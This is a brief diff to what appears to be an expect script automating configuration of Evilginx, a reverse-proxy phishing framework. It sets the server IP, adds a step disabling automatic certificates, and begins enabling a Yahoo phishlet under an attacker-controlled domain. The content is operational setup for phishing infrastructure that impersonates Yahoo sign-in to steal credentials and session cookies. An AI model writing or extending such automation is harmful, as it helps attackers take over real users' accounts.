@@ -650,6 +650,8 @@ expect {
         expect -re "evilginx\s+>"
         send "config ipv4 $VPS_IP\r"
         expect -re "evilginx\s+>"
+        send "config autocert off\r"
+        expect -re "evilginx\s+>"
         
         # Enable phishlets
         send "phishlets hostname yahoo $EP1.$DOMAIN\r"
